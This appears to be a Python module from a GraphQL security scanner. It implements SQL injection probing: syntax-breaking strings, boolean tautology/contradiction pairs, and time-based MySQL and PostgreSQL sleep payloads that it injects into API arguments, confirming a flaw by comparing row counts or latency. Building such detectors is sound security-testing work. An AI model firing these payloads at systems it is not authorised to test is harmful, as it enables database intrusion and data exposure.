"""SQL injection family.

Two-stage, evidence-directed (doc 02 §3): a syntax-breaking probe first, and if
it provokes a database error, escalate to a time-based confirmation against the
operation's latency baseline. Error signatures are a *signal* that a query is
being built from the input; the latency delta is what *confirms* the input
reaches a SQL evaluator.
"""

from __future__ import annotations

from prediql.oracle.evidence import Evidence, Expectation
from prediql.security.families.base import (
    Observation,
    Payload,
    ProbeFamily,
    injectable_arguments,
)
from prediql.model.schema import Operation, Schema

# Time-based payloads across engines; the loop tries them once an error signal
# shows the input reaches SQL. The benign control's latency is the reference.
_SLEEP_PAYLOADS = (
    "1' OR (SELECT 1 FROM (SELECT SLEEP(5))a)-- -",   # MySQL
    "1'; SELECT pg_sleep(5)-- -",                      # PostgreSQL
    "1' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -",
)
_SYNTAX_BREAKERS = ("'", '"', "') OR ('1'='1", "1 OR 1=1")
# (tautology, contradiction) pairs: the tautology widens a LIKE/WHERE result to
# everything, the contradiction to nothing. Comparing the two confirms boolean SQLi.
_BOOLEAN_PAIRS = (
    ("%' OR '1'='1' -- ", "%' AND '1'='2' -- "),
    ("' OR 1=1 -- ", "' AND 1=2 -- "),
)


class SqlInjectionFamily(ProbeFamily):
    id = "sql_injection"

    def seed_payloads(self, operation: Operation, schema: Schema) -> list[Payload]:
        payloads: list[Payload] = []
        for argument in self.injectable(operation, schema):
            for breaker in _SYNTAX_BREAKERS:
                payloads.append(self._inject(
                    operation, schema, argument, breaker,
                    Expectation(self.id, Evidence.DIFFERENTIAL, marker=breaker, stage="syntax"),
                ))
            # Boolean-based confirmation (engine-agnostic; the time-based path is
            # pg/mysql-only and silent on SQLite). We send a tautology and a
            # paired contradiction; differential_confirm compares them — a
            # tautology returning strictly more than its contradiction proves the
            # boolean was evaluated in SQL. Comparing the two (not a benign
            # control) is what keeps a fixed-response endpoint from false-positing.
            for taut, contra in _BOOLEAN_PAIRS:
                payloads.append(self._inject(
                    operation, schema, argument, taut,
                    Expectation(self.id, Evidence.DIFFERENTIAL, marker=taut, stage="boolean-true"),
                ))
                payloads.append(self._inject(
                    operation, schema, argument, contra,
                    Expectation(self.id, Evidence.DIFFERENTIAL, marker=contra, stage="boolean-false"),
                ))
        return payloads

    def differential_confirm(self, observations):
        # Pair tautology/contradiction observations by injected argument; confirm
        # when the tautology returned strictly more rows than its contradiction
        # (and the contradiction returned none) — attributable only to the SQL
        # boolean. A clean endpoint returns the same for both -> no confirmation.
        by_arg: dict[str, dict[str, Observation]] = {}
        for o in observations:
            if o.payload.class_id != self.id or o.payload.stage not in ("boolean-true", "boolean-false"):
                continue
            by_arg.setdefault(o.payload.argument, {})[o.payload.stage] = o
        for arg, pair in by_arg.items():
            taut, contra = pair.get("boolean-true"), pair.get("boolean-false")
            if not taut or not contra:
                continue
            tn, cn = _cardinality(taut.body), _cardinality(contra.body)
            if tn > 0 and cn == 0 and tn > cn:
                return (taut.payload,
                        f"boolean SQLi on {arg!r}: tautology returned {tn} rows, "
                        f"contradiction returned {cn} — the injected boolean was evaluated in SQL")
        return None

    def refine(
        self, operation: Operation, schema: Schema, observations: list[Observation]
    ) -> list[Payload]:
        # Escalate only where a DB error actually surfaced: that is the evidence
        # the input is being compiled into SQL. Time-based then confirms it
        # without needing to guess column counts for a UNION.
        errored = {
            o.payload.argument for o in observations if o.evidence == Evidence.ERROR_SIGNATURE
        }
        payloads: list[Payload] = []
        for argument in errored:
            for sleep in _SLEEP_PAYLOADS:
                payloads.append(self._inject(
                    operation, schema, argument, sleep,
                    Expectation(self.id, Evidence.LATENCY, marker=sleep, stage="time-based"),
                ))
        return payloads


def _cardinality(body) -> int:
    """Largest list length in a response body's data (0 if none/empty)."""
    data = body.get("data") if isinstance(body, dict) else None
    if not isinstance(data, dict):
        return 0
    best = 0
    for v in data.values():
        if isinstance(v, list):
            best = max(best, len(v))
        elif isinstance(v, dict) and v:
            best = max(best, 1)
    return best
